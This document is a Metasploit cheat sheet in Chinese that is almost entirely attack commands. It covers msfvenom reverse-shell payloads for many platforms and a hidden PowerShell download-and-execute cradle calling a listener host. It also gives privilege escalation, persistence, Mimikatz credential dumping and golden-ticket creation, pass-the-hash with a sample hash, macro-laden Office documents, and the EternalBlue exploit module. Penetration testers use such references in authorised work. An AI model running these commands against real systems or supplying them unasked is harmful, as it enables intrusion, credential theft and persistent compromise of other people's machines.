# Metasploit

## 目录 (Summary)

* [安装 (Installation)](#installation)
* [会话管理 (Sessions)](#sessions)
* [后台处理器 (Background handler)](#background-handler)
* [Meterpreter 基础 (Meterpreter - Basic)](#meterpreter---basic)
    * [生成 Meterpreter (Generate a meterpreter)](#generate-a-meterpreter)
    * [Meterpreter Web 投递 (Meterpreter Webdelivery)](#meterpreter-webdelivery)
    * [获取系统权限 (Get System)](#get-system)
    * [持久化启动 (Persistence Startup)](#persistence-startup)
    * [网络监控 (Network Monitoring)](#network-monitoring)
    * [端口转发 (Portforward)](#portforward)
    * [上传 / 下载 (Upload / Download)](#upload--download)
    * [内存执行 (Execute from Memory)](#execute-from-memory)
    * [Mimikatz](#mimikatz)
    * [哈希传递 - PSExec (Pass the Hash - PSExec)](#pass-the-hash---psexec)
    * [使用 SOCKS 代理 (Use SOCKS Proxy)](#use-socks-proxy)
* [Metasploit 脚本化 (Scripting Metasploit)](#scripting-metasploit)
* [多重传输方式 (Multiple transports)](#multiple-transports)
* [精选利用模块 (Best of - Exploits)](#best-of---exploits)
* [参考资料 (References)](#references)

## 安装 (Installation)

```powershell
curl https://raw.githubusercontent.com/rapid7/metasploit-omnibus/master/config/templates/metasploit-framework-wrappers/msfupdate.erb > msfinstall && chmod 755 msfinstall && ./msfinstall
```

## 会话管理 (Sessions)

```powershell
CTRL+Z   -> 将会话置于后台 (Session in Background)
sessions -> 列出会话
sessions -i <会话编号> -> 与指定 ID 的会话进行交互
sessions -u <会话编号> -> 将会话升级为 meterpreter
sessions -u <会话编号> LPORT=4444 PAYLOAD_OVERRIDE=meterpreter/reverse_tcp HANDLER=false -> 将会话升级为 meterpreter

sessions -c <命令>         -> 在多个会话上执行一条命令
sessions -i 10-20 -c "id" -> 在多个会话上执行一条命令
```

## 后台处理器 (Background handler)

`ExitOnSession`: 如果 meterpreter 退出，处理器 (handler) 不会随之退出。

```powershell
screen -dRR
sudo msfconsole

use exploit/multi/handler
set PAYLOAD generic/shell_reverse_tcp
set LHOST 0.0.0.0
set LPORT 4444
set ExitOnSession false

generate -o /tmp/meterpreter.exe -f exe
to_handler

[ctrl+a] + [d]
```

## Meterpreter 基础 (Meterpreter - Basic)

### 生成 Meterpreter (Generate a meterpreter)

```powershell
msfvenom -p linux/x86/meterpreter/reverse_tcp LHOST="10.10.10.110" LPORT=4242 -f elf > shell.elf
msfvenom -p windows/meterpreter/reverse_tcp LHOST="10.10.10.110" LPORT=4242 -f exe > shell.exe
msfvenom -p osx/x86/shell_reverse_tcp LHOST="10.10.10.110" LPORT=4242 -f macho > shell.macho
msfvenom -p php/meterpreter_reverse_tcp LHOST="10.10.10.110" LPORT=4242 -f raw > shell.php; cat shell.php | pbcopy && echo '<?php ' | tr -d '\n' > shell.php && pbpaste >> shell.php
msfvenom -p windows/meterpreter/reverse_tcp LHOST="10.10.10.110" LPORT=4242 -f asp > shell.asp
msfvenom -p java/jsp_shell_reverse_tcp LHOST="10.10.10.110" LPORT=4242 -f raw > shell.jsp
msfvenom -p java/jsp_shell_reverse_tcp LHOST="10.10.10.110" LPORT=4242 -f war > shell.war
msfvenom -p cmd/unix/reverse_python LHOST="10.10.10.110" LPORT=4242 -f raw > shell.py
msfvenom -p cmd/unix/reverse_bash LHOST="10.10.10.110" LPORT=4242 -f raw > shell.sh
msfvenom -p cmd/unix/reverse_perl LHOST="10.10.10.110" LPORT=4242 -f raw > shell.pl
```

### Meterpreter Web 投递 (Meterpreter Webdelivery)

在 8080 端口设置 Powershell Web 投递监听。

```powershell
use exploit/multi/script/web_delivery
set TARGET 2
set payload windows/x64/meterpreter/reverse_http
set LHOST 10.0.0.1
set LPORT 4444
run
```

```powershell
powershell.exe -nop -w hidden -c $g=new-object net.webclient;$g.proxy=[Net.WebRequest]::GetSystemWebProxy();$g.Proxy.Credentials=[Net.CredentialCache]::DefaultCredentials;IEX $g.downloadstring('http://10.0.0.1:8080/rYDPPB');
```

### 获取系统权限 (Get System)

```powershell
meterpreter > getsystem
...got system via technique 1 (Named Pipe Impersonation (In Memory/Admin)).

meterpreter > getuid
Server username: NT AUTHORITY\SYSTEM
```

### 持久化启动 (Persistence Startup)

```powershell
选项 (OPTIONS):

-A        自动启动匹配的 exploit/multi/handler 以连接到 agent
-L <opt>  目标主机中写入 payload 的位置，默认使用 %TEMP%
-P <opt>  要使用的 Payload，默认为 windows/meterpreter/reverse_tcp
-S        开机时自动作为服务启动 agent (具有 SYSTEM 权限)
-T <opt>  要使用的备用可执行文件模板
-U        用户登录时自动启动 agent
-X        系统启动时自动启动 agent
-h        显示帮助菜单
-i <opt>  每次连接尝试之间的时间间隔 (秒)
-p <opt>  运行 Metasploit 的系统监听的端口
-r <opt>  运行 Metasploit 的系统的 IP 地址，用于等待连接返回

meterpreter > run persistence -U -p 4242
```

### 网络监控 (Network Monitoring)

```powershell
# 列出网卡接口
run packetrecorder -li

# 录制 1 号接口的流量
run packetrecorder -i 1
```

### 端口转发 (Portforward)

```powershell
portfwd add -l 7777 -r 172.17.0.2 -p 3006
```

### 上传 / 下载 (Upload / Download)

```powershell
upload /path/in/hdd/payload.exe exploit.exe
download /path/in/victim
```

### 内存执行 (Execute from Memory)

```powershell
execute -H -i -c -m -d calc.exe -f /root/wce.exe -a  -w
```

### Mimikatz

```powershell
load mimikatz
mimikatz_command -f version
mimikatz_command -f samdump::hashes
mimikatz_command -f sekurlsa::wdigest
mimikatz_command -f sekurlsa::searchPasswords
mimikatz_command -f sekurlsa::logonPasswords full
```

```powershell
load kiwi
creds_all
golden_ticket_create -d <域名> -k <krbtgt 的 nthash> -s <不包含 RID 的 SID> -u <用于票据的用户名> -t <存储票据的位置>
```

### 哈希传递 - PSExec (Pass the Hash - PSExec)

```powershell
msf > use exploit/windows/smb/psexec
msf exploit(psexec) > set payload windows/meterpreter/reverse_tcp
msf exploit(psexec) > exploit
SMBDomain             WORKGROUP                                                          no        用于身份验证的 Windows 域名
SMBPass               598ddce2660d3193aad3b435b51404ee:2d20d252a479f485cdf5e171d93985bf  no        指定用户名的密码 (或哈希)
SMBUser               Lambda                                                             no        用于身份验证的用户名
```

### 使用 SOCKS 代理 (Use SOCKS Proxy)

```powershell
setg Proxies socks4:127.0.0.1:1080
```

## Metasploit 脚本化 (Scripting Metasploit)

使用 `.rc 文件`写入要执行的命令，然后运行 `msfconsole -r ./file.rc`。
以下是一个简单的示例，用于脚本化部署处理器并创建带有宏的 Office 文档。

```powershell
use exploit/multi/handler
set PAYLOAD windows/meterpreter/reverse_https
set LHOST 0.0.0.0
set LPORT 4646
set ExitOnSession false
exploit -j -z


use exploit/multi/fileformat/office_word_macro 
set PAYLOAD windows/meterpreter/reverse_https
set LHOST 10.10.14.22
set LPORT 4646
exploit
```

## 多重传输方式 (Multiple transports)

```powershell
msfvenom -p windows/meterpreter_reverse_tcp lhost=<host> lport=<port> sessionretrytotal=30 sessionretrywait=10 extensions=stdapi,priv,powershell extinit=powershell,/home/ionize/AddTransports.ps1 -f exe
```

然后，在 `AddTransports.ps1` 中：

```powershell
Add-TcpTransport -lhost <host> -lport <port> -RetryWait 10 -RetryTotal 30
Add-WebTransport -Url http(s)://<host>:<port>/<luri> -RetryWait 10 -RetryTotal 30
```

## 精选利用模块 (Best of - Exploits)

* MS17-10 永恒之蓝 (Eternal Blue) - `exploit/windows/smb/ms17_010_eternalblue`
* MS08_67 - `exploit/windows/smb/ms08_067_netapi`

## 参考资料 (References)

* [Multiple transports in a meterpreter payload - ionize](https://ionize.com.au/multiple-transports-in-a-meterpreter-payload/)
* [Creating Metasploit Payloads - Peleus](https://netsec.ws/?p=331)
